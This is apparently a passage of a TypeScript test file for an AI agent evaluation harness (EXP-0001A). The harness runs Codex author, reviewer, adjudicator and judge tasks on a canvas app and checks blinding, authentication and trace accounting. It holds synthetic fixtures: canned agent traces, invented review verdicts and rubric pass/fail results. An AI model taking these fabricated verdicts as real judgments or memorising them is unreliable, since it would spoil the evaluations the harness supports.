      "const mutationResult = await tools.call('apply_canvas_transaction', { operations: [] }); if (!mutationResult.ok) throw new Error('mutation failed');",
      "const inspectionResult = await tools.call('inspect_canvas_scope', { scope: { kind: 'room' } }); if (!inspectionResult.ok) throw new Error('inspection failed');",
      "const pngResult = await tools.call('export_canvas_png', {}); if (!pngResult.ok) throw new Error('png failed');",
    ].join("\n")
    : "";
  const traceItems = options.includeTrace === false ? [] : [
    {
      type: "commandExecution",
      id: "exec-browser-skill",
      command: `/bin/zsh -lc "sed -n '1,240p' /fixture/browser/${EXP0001A_BROWSER_SKILL_VERSION}/skills/control-in-app-browser/SKILL.md"`,
      cwd: "/fixture/projectless-task",
      status: "completed",
      exitCode: 0,
      durationMs: 1,
    },
    {
      type: "mcpToolCall",
      id: "exec-browser-session",
      server: "node_repl",
      tool: "js",
      arguments: {
        code: [
          `const { setupBrowserRuntime } = await import('/fixture/browser/${EXP0001A_BROWSER_SKILL_VERSION}/scripts/browser-client.mjs');`,
          "const agent = await setupBrowserRuntime();",
          `const browser = await agent.browsers.getForUrl('${targetUrl}');`,
          "const tab = await browser.tabs.new();",
          `await tab.goto('${navigationUrl}');`,
          packetFileNavigationCode,
          webMcpCode,
          options.extraTraceCode ?? "",
        ].filter(Boolean).join("\n"),
        title: "Operate on the exact isolated task surface",
      },
      status: options.nodeStatus ?? "completed",
      durationMs: 10,
    },
  ];
  const finalItems = options.includeFinal === false ? [] : [{
    type: "agentMessage",
    id: "message-terminal",
    text: options.truncated ? text.slice(0, Math.max(1, text.length - 1)) : text,
    phase: "final_answer",
    ...(options.truncated ? { truncated: true, originalChars: text.length } : {}),
  }];
  const payload = {
    schemaVersion: 1 as const,
    thread: { id: lifecycle.threadId!, hostId: lifecycle.hostId!, kind: "codex", status: { type: "idle" } },
    page: {
      order: "newest_first" as const,
      limit: 10 as const,
      nextCursor: hasMore ? (options.nextCursor ?? "older-page-cursor") : null,
      hasMore,
    },
    turns: [{
      id: "turn-terminal",
      status: "completed",
      items: [...traceItems, ...finalItems],
    }],
  };
  return codexAppResult(payload);
}

function traceObservation(plan: Exp0001aCodexTaskTransportPlan, lifecycle: Exp0001aCodexTaskLifecycle, complete = true) {
  const review = plan.role !== "author";
  const packet = review ? plan.envelope.role === "author" ? null : plan.envelope.artifactPacket : null;
  return {
    schemaVersion: 1 as const,
    kind: "codex-retained-task-trace-observation" as const,
    codexTaskId: lifecycle.codexTaskId!,
    capturedAt: "2026-08-30T20:02:04.500Z",
    completeness: complete ? "complete-retained-trace" as const : "truncated-or-unobservable" as const,
    taskTraceDigest: digest(`trace-${plan.role}`),
    platformBootstrap: {
      skillId: complete ? EXP0001A_BROWSER_SKILL_ID : "unobservable" as const,
      skillVersion: complete ? EXP0001A_BROWSER_SKILL_VERSION : "unobservable" as const,
      skillDigest: complete ? EXP0001A_BROWSER_SKILL_DIGEST : "unobservable" as const,
      resolvedSkillPathDigest: complete ? digest("resolved-browser-skill-path") : "unobservable" as const,
      skillReadCount: complete ? 1 : "unobservable" as const,
    },
    commandExecutionCount: complete ? 1 : "unobservable" as const,
    otherCommandExecutionCount: complete ? 0 : "unobservable" as const,
    filesystemReadCount: complete ? 1 : "unobservable" as const,
    filesystemWriteCount: complete ? 0 : "unobservable" as const,
    repositoryReadCount: complete ? 0 : "unobservable" as const,
    privateApiRequestCount: complete ? 0 : "unobservable" as const,
    directHttpRequestCount: complete ? 0 : "unobservable" as const,
    preexistingBrowserContextUsed: complete ? false : "unobservable" as const,
    browserOrigins: complete ? (review ? [new URL(packet!.origin).origin] : ["https://www.jazzboard.xyz"]) : "unobservable" as const,
    jazzboardBrowserNavigationCount: complete ? (review ? 0 : 2) : "unobservable" as const,
    jazzboardRoomIdsAccessed: complete ? (review ? [] : [ROOM_ID]) : "unobservable" as const,
    jazzboardRoomAccessBindingDigests: complete
      ? (review ? [] : [computePrivateRoomAccessBinding({ privateRoomUrl: INVITE_URL, roomId: ROOM_ID })])
      : "unobservable" as const,
    jazzboardInviteUrlDigests: complete ? (review ? [] : [hashCanonicalJson(INVITE_URL)]) : "unobservable" as const,
    webMcpCallCount: complete ? (review ? 0 : 8) : "unobservable" as const,
    webMcpFailureCount: complete ? 0 : "unobservable" as const,
    webMcpToolNames: complete ? (review ? [] : [
      "apply_canvas_transaction",
      "export_canvas_png",
      "get_canvas_capabilities",
      "inspect_canvas_scope",
      "read_room_state",
    ]) : "unobservable" as const,
    webMcpOrigins: complete ? (review ? [] : ["https://www.jazzboard.xyz"]) : "unobservable" as const,
    openedArtifactPacketManifestDigest: complete ? (review ? packet!.manifestDigest : null) : "unobservable" as const,
    openedArtifactPacketFileDigests: complete ? (review ? packet!.files.map((file) => file.sha256) : null) : "unobservable" as const,
    observationEvidenceDigest: digest(`trace-observation-${plan.role}`),
  };
}

function reviewResult(role: "primary_reviewer" | "adjudicator") {
  return {
    schemaVersion: "blinded-canvas-review-result/v1" as const,
    role,
    evidenceCoverage: { semanticState: true as const, imageSlots: ["image-01"] },
    criteria: [
      { criterionId: "semantic-completeness", decision: "pass" as const, evidenceRefs: ["rubric:semantic-completeness", "semantic_state"], rationale: "Required services are present." },
      { criterionId: "visual-readability", decision: "pass" as const, evidenceRefs: ["rubric:visual-readability", "image-01"], rationale: "Final labels and connectors are readable." },
    ],
    accepted: true,
    primaryFailureClass: "SUCCESS" as const,
    mechanismTags: [{ tag: "layout", evidenceRefs: ["image-01"] }],
    revisionAssessment: {
      revisions: [
        { imageSlot: "image-01", roomRevision: 4, usable: true, findings: [] },
      ],
      finalImageSlot: "image-01",
    },
    rationale: "All frozen criteria pass in the final evidence.",
  };
}

function frozenReviewResultForPlan(
  plan: Exp0001aCodexTaskTransportPlan,
  accepted = true,
): JsonValue {
  if ((plan.role !== "primary_reviewer" && plan.role !== "adjudicator")
      || plan.envelope.role === "author" || plan.envelope.role === "pairwise_visual_judge") {
    throw new Error("review plan required");
  }
  if (plan.envelope.role === "primary_reviewer"
      && plan.envelope.kind === "primary-reviewer-author-failure-task-envelope") {
    return {
      schemaVersion: "blinded-author-failure-review-result/v1",
      role: "primary_reviewer",
      status: "non_evaluable",
      failureEvidenceRoot: plan.envelope.failureEvidenceRoot,
      primaryFailureClass: "FAIL_AUTHOR_NONCOMPLETION",
      rationale: "The retained author task did not produce an authoritative complete artifact.",
    };
  }
  const evidence = plan.envelope.evidence;
  const images = evidence.images;
  return {
    schemaVersion: "blinded-canvas-review-result/v1",
    role: plan.role,
    evidenceCoverage: { semanticState: true, imageSlots: images.map((image) => image.slot) },
    criteria: evidence.rubric.criterionIds.map((criterionId, index) => ({
      criterionId,
      decision: accepted || index > 0 ? "pass" : "fail",
      evidenceRefs: [`rubric:${criterionId}`, index % 2 === 0 ? "semantic_state" : images[0]!.slot],
      rationale: accepted || index > 0
        ? "The exact retained evidence satisfies this frozen criterion."
        : "The exact retained evidence does not satisfy this frozen criterion.",
    })),
    accepted,
    primaryFailureClass: accepted ? "SUCCESS" : "FAIL_SEMANTIC",
    mechanismTags: [],
    revisionAssessment: {
      revisions: images.map((image) => ({ imageSlot: image.slot, roomRevision: image.roomRevision,
        usable: true, findings: [] })),
      finalImageSlot: images.at(-1)!.slot,
    },
    rationale: accepted
      ? "Every frozen criterion passes against the retained evidence."
      : "One frozen semantic criterion fails against the retained evidence.",
  };
}

function pairwiseResultForPlan(plan: Exp0001aCodexTaskTransportPlan): JsonValue {
  if (plan.role !== "pairwise_visual_judge" || plan.envelope.role !== "pairwise_visual_judge") {
    throw new Error("pairwise plan required");
  }
  return plan.envelope.kind === "pairwise-visual-unavailable-task-envelope"
    ? {
      schemaVersion: "blinded-canvas-pairwise-unavailable-result/v1",
      role: "pairwise_visual_judge",
      status: "non_evaluable",
      preference: "unavailable",
      pairRoot: plan.envelope.pairRoot,
      primaryFailureClass: "FAIL_AUTHOR_NONCOMPLETION",
      rationale: "One retained side has no authoritative final pixels.",
    }
    : {
      schemaVersion: "blinded-canvas-pairwise-result/v1",
      role: "pairwise_visual_judge",
      preference: "canvas-1",
      evidenceRefs: ["canvas-1:image-01", "canvas-2:image-01", "frozen_rubric"],
      rationale: "Canvas one has the stronger readable composition in the exact retained evidence.",
    };
}

function usageLimitWait(
  lifecycle: Exp0001aCodexTaskLifecycle,
  timing: Readonly<{ waitIssuedAt: string; terminalCompletedAt: string; waitObservedAt: string }> = {
    waitIssuedAt: "2026-08-30T20:02:03.000Z",
    terminalCompletedAt: "2026-08-30T20:02:03.500Z",
    waitObservedAt: "2026-08-30T20:02:04.000Z",
  },
): Exp0001aCodexTaskLifecycle {
  const command = issueExp0001aWaitThreadsCommand({ lifecycle, issuedAt: timing.waitIssuedAt });
  return recordExp0001aWaitThreadsResult({
    lifecycle,
    command,
    observedAt: timing.waitObservedAt,
    rawResult: codexAppResult({
      timedOut: false,
      wake: { reason: "turnFailed", turnId: "turn-usage-limit", threadId: lifecycle.threadId!, hostId: lifecycle.hostId! },
      polls: [{
        schemaVersion: 1,
        cursor: `cursor-${lifecycle.codexTaskId}`,
        revision: 1,
        changed: true,
        thread: { id: lifecycle.threadId!, hostId: lifecycle.hostId!, status: { type: "idle" } },
        latestTurn: {
          id: "turn-usage-limit",
          status: "failed",
          error: { code: "subscription_usage_limit" },
          startedAt: Date.parse(timing.waitIssuedAt) / 1_000,
          completedAt: Date.parse(timing.terminalCompletedAt) / 1_000,
          durationMs: 500,
        },
        latestAssistantMessageId: null,
        latestAssistantMessage: null,
        latestToolMarkerId: null,
        latestToolMarker: null,
      }],
    }),
  });
}

function finalRoomReadReceipt(
  plan: Exp0001aCodexTaskTransportPlan,
  lifecycle: Exp0001aCodexTaskLifecycle,
  _trace?: ReturnType<typeof traceObservation>,
  roomRevision = 4,
  objectCount = 5,
  timing: Readonly<{ evidenceIssuedAt: string; evidenceObservedAt: string }> = {
    evidenceIssuedAt: "2026-08-30T20:02:04.250Z",
    evidenceObservedAt: "2026-08-30T20:02:04.750Z",
  },
): Exp0001aAuthorFinalRoomReadReceipt {
  const command = issueExp0001aAuthorFinalEvidenceCommand({
    plan,
    lifecycle,
    issuedAt: timing.evidenceIssuedAt,
  });
  return recordExp0001aAuthorFinalEvidenceResult({
    plan,
    lifecycle,
    command,
    observedAt: timing.evidenceObservedAt,
    rawResult: finalAuthorEvidence(plan, roomRevision, objectCount),
  });
}

async function retainSyntheticTerminalTask(
  plan: Exp0001aCodexTaskTransportPlan,
  terminalJson: JsonValue,
  threadId: string,
  timing?: Readonly<{
    releasedAt: string;
    createObservedAt: string;
    waitIssuedAt: string;
    terminalCompletedAt: string;
    waitObservedAt: string;
    evidenceIssuedAt: string;
    evidenceObservedAt: string;
    readIssuedAt: string;
    readObservedAt: string;
  }>,
): Promise<Readonly<{
  release: Awaited<ReturnType<typeof recordExp0001aCreateThreadReleaseInvoked>>;
  lifecycle: Exp0001aCodexTaskLifecycle;
}>> {
  const { release, lifecycle: running } = await begin(plan, threadId, timing);
  const awaitingRead = completeWait(running, terminalJson, timing);
  const command = issueExp0001aReadThreadCommand({
    lifecycle: awaitingRead,
    issuedAt: timing?.readIssuedAt ?? "2026-08-30T20:02:06.000Z",
  });
  const lifecycle = recordExp0001aReadThreadResult({
    plan,
    lifecycle: awaitingRead,
    command,
    observedAt: timing?.readObservedAt ?? "2026-08-30T20:02:07.000Z",
    rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson),
    finalAuthoritativeEvidenceReceipt: plan.role === "author"
      ? finalRoomReadReceipt(plan, awaitingRead, undefined, 4, 5, timing)
      : null,
  });
  return { release, lifecycle };
}

const ONE_PIXEL_PNG_BASE64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";
const DIFFERENT_ONE_PIXEL_PNG_BASE64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Wl2nXsAAAAASUVORK5CYII=";

function finalAuthorEvidence(
  plan: Exp0001aCodexTaskTransportPlan,
  roomRevision = 4,
  objectCount = 5,
): Exp0001aAuthorFinalEvidenceResultInput {
  if (plan.envelope.role !== "author") throw new Error("author plan required");
  const objects = Array.from({ length: objectCount }, (_, index) => ({
    id: `object-${index + 1}`,
    kind: "shape" as const,
    semanticName: `Service ${index + 1}`,
    semanticRole: "service",
    x: index * 160,
    y: 100,
    width: 120,
    height: 80,
    rotation: 0,
    zIndex: index,
    revision: 1,
    groupId: null,
    diagramIds: [],
    shape: "rectangle" as const,
    nodeType: "service" as const,
    nodeMetadata: null,
    label: `Service ${index + 1}`,
    fill: "#ffffff",
    stroke: "#111111",
    createdAt: 1_777_777_777,
    updatedAt: 1_777_777_778,
    createdBy: { participantId: "private-author-id", displayName: "Private Author", userId: "secret-user" },
    lastEditedBy: { participantId: "private-editor-id", displayName: "Private Editor", actorId: "secret-actor" },
    futureMetadata: { ownerId: "secret-owner", member: { creator: "secret-creator" } },
  }));
  const pngBytes = Buffer.from(ONE_PIXEL_PNG_BASE64, "base64");
  const rawInspectionResult = {
      ok: true,
      tool: "inspect_canvas_scope",
      data: { previewId: "preview-final", sourceRevisions: { roomRevision, objects: [] } },
    };
  const rawPngExportResult = {
      ok: true,
      tool: "export_canvas_png",
      data: {
        filename: "final.png",
        mimeType: "image/png",
        width: 1,
        height: 1,
        byteLength: pngBytes.byteLength,
        sourceRevisions: { roomRevision, objects: [] },
        warnings: [],
        persistedByJazzboard: false,
      },
    };
  const rawRoomReadResult = {
      ok: true,
      tool: "read_room_state",
      data: {
        room: { id: plan.envelope.roomId, roomRevision, title: "Private experiment room" },
        objects,
        diagrams: [],
        participants: [],
        leases: [],
        spotlight: null,
      },
    };
  return {
    inspectionCallResult: codexAppResult(rawInspectionResult),
    pngExportCallResult: {
      content: [
        { type: "text", text: canonicalJson(rawPngExportResult) },
        { type: "image", data: ONE_PIXEL_PNG_BASE64, mimeType: "image/png" },
      ],
      isError: false,
    },
    roomReadCallResult: codexAppResult(rawRoomReadResult),
  };
}

async function retainedDisagreeingPrimaryPair(input: Exp0001aReviewEvidenceInput) {
  const createPrimary = async <TSlot extends "primary-review-1" | "primary-review-2">(
    slot: TSlot,
    accepted: boolean,
  ) => {
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(input);
    const ordinal = slot === "primary-review-1" ? "one" : "two";
    const plan = prepare(envelope, await packetReceipt(envelope), {
      transportId: `transport-primary-${ordinal}-unique`,
      assignmentId: `assignment-primary-${ordinal}-private`,
      attemptId: `attempt-primary-${ordinal}-private`,
    });
    const { lifecycle: running } = await begin(plan, `thread-primary-${ordinal}-unique`);
    const passing = reviewResult("primary_reviewer");
    const result = accepted ? passing : {
      ...passing,
      criteria: passing.criteria.map((criterion, index) => index === 0
        ? { ...criterion, decision: "fail" as const, rationale: "A required service is absent from the retained evidence." }
        : criterion),
      accepted: false,
      primaryFailureClass: "FAIL_SEMANTIC" as const,
      rationale: "The retained evidence fails one frozen semantic criterion.",
    };
    const terminalResultDigest = terminalTextDigest(result);
    const awaitingRead = completeWait(running, result);
    const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
    const lifecycle = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, result),
      finalAuthoritativeEvidenceReceipt: null,
    });
    return { slot, plan, lifecycle } as Readonly<{ slot: TSlot; plan: typeof plan; lifecycle: typeof lifecycle }>;
  };
  return [
    await createPrimary("primary-review-1", true),
    await createPrimary("primary-review-2", false),
  ] as const;
}

async function retainedScoredAndFailedPrimaryPair(input: Exp0001aReviewEvidenceInput) {
  const scoredPair = await retainedDisagreeingPrimaryPair(input);
  const envelope = createExp0001aPrimaryReviewerTaskEnvelope(input);
  const plan = prepare(envelope, await packetReceipt(envelope), {
    transportId: "transport-primary-failed-unique",
    assignmentId: "assignment-primary-failed-private",
    attemptId: "attempt-primary-failed-private",
  });
  const { lifecycle: running } = await begin(plan, "thread-primary-failed-unique");
  const invalidTerminal = { schemaVersion: "invalid-primary-result/v1", accepted: false } as const;
  const awaitingRead = completeWait(running, invalidTerminal);
  const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
  const lifecycle = recordExp0001aReadThreadResult({
    plan,
    lifecycle: awaitingRead,
    command,
    observedAt: "2026-08-30T20:02:07.000Z",
    rawResult: rawReadThreadPage(plan, awaitingRead, invalidTerminal),
    finalAuthoritativeEvidenceReceipt: null,
  });
  expect(lifecycle).toMatchObject({ terminalOutcome: "non_evaluable", readReceipt: { terminalArtifact: null } });
  return [
    scoredPair[0],
    { slot: "primary-review-2" as const, plan, lifecycle },
  ] as const;
}

describe("EXP-0001A Codex-native task transport", () => {
  it("prepares a neutral, projectless author task only after the sealed spike and fresh ChatGPT auth", () => {
    const envelope = authorEnvelope();
    const plan = prepare(envelope);
    const prompt = plan.createThreadCommand.arguments.prompt;
    expect(plan).toMatchObject({ role: "author", model: "gpt-5.6-sol", reasoningEffort: "max" });
    expect(plan.createThreadCommand.arguments.target.type).toBe("projectless");
    expect(plan.createThreadCommand.arguments.title).toMatch(/^Canvas task \[tx-[a-f0-9]{16}\]$/);
    expect(plan.createThreadCommand.arguments.target.directoryName).toMatch(/^canvas-task-[a-f0-9]{16}$/);
    expect(prompt).toContain(envelope.publicTaskBrief);
    expect(prompt).toContain(INVITE_URL);
    expect(prompt).not.toContain(ROOM_ID);
    expect(prompt).not.toMatch(/EXP-0001A|experiment|isolated author|"role":"author"|assignment-author|attempt-author/i);
    expect(plan.spikePrerequisite.verified).toBe(true);
    expect(plan.authPreflight).toMatchObject({ authenticationMethod: "chatgpt", decision: "allow" });
    expect(() => prepare(envelope, null, { authorProvisioning: undefined })).toThrow(/CANONICAL_PROVISIONING_EVIDENCE/);
    expect(() => prepare(envelope, null, { assignmentId: "assignment-wrong-private" })).toThrow(/exact provisioned assignment/i);
  });

  it("requires the independently verified room receipt and independently re-rendered public packet", () => {
    authorEnvelope();
    const handoff = provisioningVerificationMock.handoff as {
      authorVisible: { renderedPublicBrief: string; [key: string]: unknown };
      [key: string]: unknown;
    };
    const receipt = provisioningVerificationMock.roomReceipt as {
      room: { roomId: string; [key: string]: unknown };
      [key: string]: unknown;
    };
    provisioningVerificationMock.roomReceipt = {
      ...receipt,
      room: { ...receipt.room, roomId: "room_aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee" },
    };
    expect(() => createExp0001aAuthorTaskEnvelopeFromProvisioningHandoff(handoff, receipt)).toThrow(/RETAINED_ROOM_RECEIPT_DIFFER/);

    provisioningVerificationMock.roomReceipt = receipt;
    provisioningVerificationMock.handoff = {
      ...handoff,
      authorVisible: { ...handoff.authorVisible, renderedPublicBrief: `${handoff.authorVisible.renderedPublicBrief}\nInjected detail` },
    };
    expect(() => createExp0001aAuthorTaskEnvelopeFromProvisioningHandoff(handoff, receipt)).toThrow(/PUBLIC_PACKET_BINDING|UNDECLARED_CONTEXT/);
  });

  it("blocks missing/tampered spike evidence and stale or API-key auth", () => {
    const envelope = authorEnvelope();
    const spike = passingSpike();
    expect(() => prepare(envelope, null, { spikeGate: { ...spike.gate, decision: "block" } })).toThrow();
    expect(() => prepare(envelope, null, {
      authPreflightReceipt: chatGptAuth(new Date(Date.parse(PREPARED) - EXP0001A_CODEX_AUTH_MAX_AGE_MS - 1).toISOString()),
    })).toThrow(/stale|preflight/i);
    const apiKey = createCodexAuthPreflightReceipt({
      stdout: "Logged in using an API key\n", stderr: "", exitCode: 0, signal: null, invocationError: false, outputLimitExceeded: false,
    }, { checkedAt: PREPARED });
    expect(() => prepare(envelope, null, { authPreflightReceipt: apiKey })).toThrow(/CHATGPT_AUTH_REQUIRED/);
  });

  it("rechecks ChatGPT auth immediately before release and rejects an auth change", async () => {
    const plan = prepare(authorEnvelope());
    const apiKey = createCodexAuthPreflightReceipt({
      stdout: "Logged in using an API key\n", stderr: "", exitCode: 0, signal: null, invocationError: false, outputLimitExceeded: false,
    }, { checkedAt: RELEASED });
    authPreflightMock.receipt = apiKey;
    await expect(recordExp0001aCreateThreadReleaseInvoked({
      plan,
      journalEvidenceDigest: digest("journal"),
    })).rejects.toThrow(/CHATGPT_AUTH_REQUIRED/);
  });

  it("uses the actual release wall clock and cannot release before provisioner presence expires", async () => {
    const plan = prepare(authorEnvelope("2026-08-30T20:02:02.000Z"));
    await expect(recordExp0001aCreateThreadReleaseInvoked({
      plan,
      journalEvidenceDigest: digest("journal-before-presence-expiry"),
    })).rejects.toThrow(/PRESENCE_NOT_EXPIRED_AT_ACTUAL_CODEX_RELEASE/);
  });

  it("refuses a create result that arrives after the fresh-auth release window", async () => {
    const plan = prepare(authorEnvelope());
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan,
      journalEvidenceDigest: digest("journal-delayed-create"),
    });
    expect(() => recordExp0001aCreateThreadResult({
      plan,
      releaseInvocationReceipt: release,
      observedAt: new Date(Date.parse(release.mustInvokeBy) + 1).toISOString(),
      rawResult: codexAppResult({ threadId: "late-create-task", hostId: "local" }),
    })).toThrow(/OUTSIDE_FRESH_AUTH_RELEASE_WINDOW/);
  });

  it("probes one immutable hash-addressed read-only loopback packet before a reviewer plan can release", async () => {
    const origin = await availableOrigin();
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(origin));
    installPacketFetch(envelope);
    const receipt = await probeExp0001aCodexArtifactPacket({ envelope, now: () => "2026-08-30T20:01:59.000Z" });
    const plan = prepare(envelope, receipt);
    const prompt = renderExp0001aCodexTaskPrompt(envelope);
    expect(plan.reasoningEffort).toBe("high");
    expect(receipt).toMatchObject({ servedFileCount: 1, unexpectedFileCount: 0, probes: { post: "rejected", put: "rejected", delete: "rejected" } });
    expect(prompt.match(/http:\/\/127\.0\.0\.1:/g)).toHaveLength(1);
    expect(prompt).not.toMatch(/jazzboard\.xyz|author transcript|condition label/i);
    expect(() => prepare(envelope, null)).toThrow(/evidence-packet/i);
  });

  it("owns the real loopback packet lifecycle and opens every retained success or unavailable file", async () => {
    const primaryEvidence = await reviewInput("http://127.0.0.1:1/", "real-packet-primary");
    const primarySubject = createExp0001aPrimaryReviewSubject({
      publicRequirement: primaryEvidence.publicRequirement,
      rubric: primaryEvidence.rubric,
      authorPlan: primaryEvidence.authorPlan,
      authorLifecycle: primaryEvidence.authorLifecycle,
    });
    const primaryServer = await startExp0001aCodexPrimaryArtifactPacketServer({
      subject: primarySubject,
      authorPlan: primaryEvidence.authorPlan,
      authorLifecycle: primaryEvidence.authorLifecycle,
      now: () => "2026-08-30T20:02:08.000Z",
    });
    expect(primaryServer.readyReceipt).toMatchObject({
      servedFileCount: 1,
      probes: { getEveryFile: "digest_verified", directoryListing: "rejected" },
    });
    const primaryStop = await primaryServer.stop({ stoppedAt: "2026-08-30T20:02:09.000Z" });
    expect(primaryStop.everyFileOpened).toBe(true);
    expect(primaryStop.servedFiles.every((file) => file.getCount >= 1)).toBe(true);

    const failed = await failedAuthorReviewInput("http://127.0.0.1:1/", "real-packet-unavailable");
    const unavailableSubject = createExp0001aPairwiseReviewSubject({
      publicRequirement: primaryEvidence.publicRequirement,
      rubric: primaryEvidence.rubric,
      sides: [
        { authorPlan: primaryEvidence.authorPlan, authorLifecycle: primaryEvidence.authorLifecycle },
        { authorPlan: failed.authorPlan, authorLifecycle: failed.authorLifecycle },
      ],
    });
    expect(unavailableSubject.kind).toBe("pairwise-review-unavailable-subject");
    const pairwiseServer = await startExp0001aCodexPairwiseArtifactPacketServer({
      subject: unavailableSubject,
      sides: [
        { authorPlan: primaryEvidence.authorPlan, authorLifecycle: primaryEvidence.authorLifecycle },
        { authorPlan: failed.authorPlan, authorLifecycle: failed.authorLifecycle },
      ],
      now: () => "2026-08-30T20:02:10.000Z",
    });
    expect(pairwiseServer.envelope.kind).toBe("pairwise-visual-unavailable-task-envelope");
    const pairwiseStop = await pairwiseServer.stop({ stoppedAt: "2026-08-30T20:02:11.000Z" });
    expect(pairwiseStop).toMatchObject({ everyFileOpened: true, servedFiles: [{ mimeType: "application/json" }] });
  });

  it("atomically derives terminal accounting from the retained transport lifecycle", async () => {
    const evidence = await reviewInput("http://127.0.0.1:1/", "accounting-finalizer");
    const accounting = finalizeExp0001aCodexTaskAccounting({
      accountingId: `accounting-${evidence.authorPlan.planDigest.slice("sha256:".length)}`,
      plan: evidence.authorPlan,
      lifecycle: evidence.authorLifecycle,
    });
    const root = await mkdtemp(path.join(tmpdir(), "exp0001a-accounting-journal-"));
    temporaryRoots.push(root);
    const provisioningState = await createExp0001aProvisioningCoordinator({
      filePath: path.join(root, "provisioning.json"),
      now: () => "2026-08-30T20:02:08.000Z",
      createRoomNonce: () => "rn_0123456789abcdef0123456789abcdef",
    }).initialize();
    const journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [evidence.authorPlan],
      releaseInvocations: [evidence.authorLifecycle.releaseInvocationReceipt],
      lifecycles: [evidence.authorLifecycle],
      accountingFinalizationReceipts: [accounting],
      authorFinalEvidenceReceipts: [evidence.authorLifecycle.readReceipt!.authorFinalRoomReadReceipt!],
    });
    const ledger = deriveExp0001aCodexAccountingLedgerFromCoordinatorJournal(journal);
    expect(ledger.tasks).toEqual([accounting.accountingRecord]);
    expect(ledger.tasks[0]).toMatchObject({
      state: "terminal",
      terminalOutcome: "succeeded",
      webMcp: { callCount: { source: "retained_task_receipt" } },
      canvas: { revisionCount: "unobservable", inspectionCount: "unobservable" },
    });
    expect(() => createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [evidence.authorPlan],
      releaseInvocations: [evidence.authorLifecycle.releaseInvocationReceipt],
      lifecycles: [evidence.authorLifecycle],
      authorFinalEvidenceReceipts: [evidence.authorLifecycle.readReceipt!.authorFinalRoomReadReceipt!],
    })).toThrow(/accounting finalization/i);
  });

  it("rejects arbitrary evidence origins, unexpected reviewer context, corrupted files, and mutable packets", async () => {
    const invalidOriginInput = await reviewInput("https://evidence.example/");
    expect(() => createExp0001aPrimaryReviewerTaskEnvelope(invalidOriginInput)).toThrow(/127\.0\.0\.1/);
    const origin = await availableOrigin();
    const punctuatedCondition = await reviewInput(origin);
    expect(() => createExp0001aPrimaryReviewerTaskEnvelope({
      ...punctuatedCondition,
      publicRequirement: "Create a readable service flow while condition=A0, remains hidden from reviewers.",
    })).toThrow(/prohibited reviewer context/i);

    const corruptOrigin = await availableOrigin();
    const corruptEnvelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(corruptOrigin));
    installPacketFetch(corruptEnvelope, { corruptFiles: true });
    await expect(probeExp0001aCodexArtifactPacket({ envelope: corruptEnvelope })).rejects.toThrow(/FILE_VERIFICATION_FAILED/);

    const mutableOrigin = await availableOrigin();
    const mutableEnvelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(mutableOrigin));
    installPacketFetch(mutableEnvelope, { acceptWrites: true });
    await expect(probeExp0001aCodexArtifactPacket({ envelope: mutableEnvelope })).rejects.toThrow(/WRITE_METHOD_ACCEPTED/);
  });

  it("keeps adjudication independent and pairwise context final-image-only", async () => {
    const adjudicatorOrigin = await availableOrigin();
    const adjudicatorInput = await reviewInput(adjudicatorOrigin);
    const primaryReviews = await retainedDisagreeingPrimaryPair(adjudicatorInput);
    const adjudicator = createExp0001aAdjudicatorTaskEnvelope({
      primaryEvidenceEnvelope: createExp0001aPrimaryReviewerTaskEnvelope(adjudicatorInput),
      primaryReviews,
    });
    const adjudicatorPrompt = renderExp0001aCodexTaskPrompt(adjudicator);
    expect(adjudicatorPrompt).not.toMatch(/primary-review-[12]|primary decision|primary result|author transcript/i);
    expect(adjudicatorPrompt).not.toContain(adjudicator.primaryReviewRoot);
    expect(adjudicatorPrompt).not.toContain(adjudicator.adjudicationSubjectRoot);
    for (const primary of adjudicator.primaryReviews) {
      expect(adjudicatorPrompt).not.toContain(primary.resultDigest);
      expect(adjudicatorPrompt).not.toContain(primary.retainedTaskBindingDigest);
      expect(adjudicatorPrompt).not.toContain(canonicalJson(primary.result));
    }
    const adjudicatorPlan = prepare(adjudicator, await packetReceipt(adjudicator), {
      transportId: "transport-adjudicator-private-disagreement-binding",
    });
    expect(adjudicatorPlan.envelope.role).toBe("adjudicator");
    if (adjudicatorPlan.envelope.role !== "adjudicator") throw new Error("expected adjudicator envelope");
    expect(adjudicatorPlan.envelope.primaryReviewRoot).toBe(adjudicator.primaryReviewRoot);
    expect(adjudicatorPlan.createThreadCommand.arguments.prompt).toBe(adjudicatorPrompt);
    expect(adjudicatorPlan.createThreadCommand.arguments.prompt).not.toContain(adjudicator.primaryReviewRoot);

    const pairOrigin = await availableOrigin();
    const pairBase = await reviewInput(pairOrigin, "pair-context-left");
    const pairOther = await reviewInput(pairOrigin, "pair-context-right");
    const pairwise = createExp0001aPairwiseVisualJudgeTaskEnvelope({
      publicRequirement: pairBase.publicRequirement,
      rubric: pairBase.rubric,
      artifactPacketOrigin: pairOrigin,
      sides: [
        { authorPlan: pairBase.authorPlan, authorLifecycle: pairBase.authorLifecycle },
        { authorPlan: pairOther.authorPlan, authorLifecycle: pairOther.authorLifecycle },
      ],
    });
    const pairPrompt = renderExp0001aCodexTaskPrompt(pairwise);
    expect(pairPrompt).toContain("canvas-1");
    expect(pairPrompt).toContain("canvas-2");
    expect(pairPrompt).not.toMatch(/semantic state|service-one|condition|attempt/i);
    expect(pairwise.kind).toBe("pairwise-visual-judge-task-envelope");
    if (pairwise.kind !== "pairwise-visual-judge-task-envelope") throw new Error("expected successful pair fixture");
